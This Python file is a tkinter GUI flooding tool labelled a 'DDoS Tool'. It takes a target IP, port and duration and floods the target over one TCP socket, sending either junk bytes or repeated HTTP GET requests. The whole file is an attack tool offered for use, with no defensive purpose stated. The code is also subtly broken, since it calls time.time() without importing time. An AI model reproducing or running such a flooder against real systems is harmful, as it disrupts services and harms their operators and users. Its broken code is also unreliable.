import tkinter as tk
from tkinter import ttk, messagebox
import socket
import threading

class DDoSApp:
    def __init__(self, master):
        self.master = master
        master.title("DDoS Tool - macOS Big Sur Style")
        master.geometry("400x300")

        self.create_menu()

        self.label_ip = ttk.Label(master, text="Target IP:")
        self.label_ip.grid(row=1, column=0, padx=10, pady=10, sticky=tk.W)

        self.entry_ip = ttk.Entry(master)
        self.entry_ip.grid(row=1, column=1)

        self.label_port = ttk.Label(master, text="Target Port:")
        self.label_port.grid(row=2, column=0, padx=10, pady=10, sticky=tk.W)

        self.entry_port = ttk.Entry(master)
        self.entry_port.grid(row=2, column=1)

        self.label_duration = ttk.Label(master, text="Duration (seconds):")
        self.label_duration.grid(row=3, column=0, padx=10, pady=10, sticky=tk.W)

        self.entry_duration = ttk.Entry(master)
        self.entry_duration.grid(row=3, column=1)

        self.layer_var = tk.StringVar()
        self.layer_var.set("Layer 4")  # Default value
        self.label_layer = ttk.Label(master, text="Attack Layer:")
        self.label_layer.grid(row=4, column=0, padx=10, pady=10, sticky=tk.W)
        self.layer_menu = ttk.OptionMenu(master, self.layer_var, "Layer 4", "Layer 4", "Layer 7")
        self.layer_menu.grid(row=4, column=1, padx=10, pady=10, sticky=tk.W)

        self.button_start = ttk.Button(master, text="Start DDoS", command=self.start_ddos)
        self.button_start.grid(row=5, columnspan=2, pady=10)

    def create_menu(self):
        menubar = tk.Menu(self.master)
        self.master.config(menu=menubar)

        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="Exit", command=self.master.quit)

        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label="About", command=self.show_about)

        menubar.add_cascade(label="File", menu=file_menu)
        menubar.add_cascade(label="Help", menu=help_menu)

    def start_ddos(self):
        target_ip = self.entry_ip.get()
        target_port = int(self.entry_port.get())
        duration = int(self.entry_duration.get())
        attack_layer = self.layer_var.get()

        # Create a new thread for DDoS attack
        threading.Thread(target=self.ddos, args=(target_ip, target_port, duration, attack_layer)).start()

    def ddos(self, target_ip, target_port, duration, attack_layer):
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect to the target
            s.connect((target_ip, target_port))
            
            print(f"DDoS attack started on {target_ip}:{target_port} for {duration} seconds")
            # Send data until duration expires
            start_time = time.time()
            while (time.time() - start_time) < duration:
                if attack_layer == "Layer 4":
                    s.send(b'Data to flood the target with...')
                elif attack_layer == "Layer 7":
                    # Send HTTP GET requests
                    http_request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
                    s.send(http_request)
                
            # Close the socket
            s.close()
            print("DDoS attack finished.")
            messagebox.showinfo("DDoS Attack", "DDoS attack finished.")
        except Exception as e:
            print("Error: ", e)
            messagebox.showerror("Error", f"An error occurred: {e}")

    def show_about(self):
        messagebox.showinfo("About", "DDoS Tool\nVersion 1.0\nDeveloped by Your Name")

def main():
    root = tk.Tk()
    app = DDoSApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
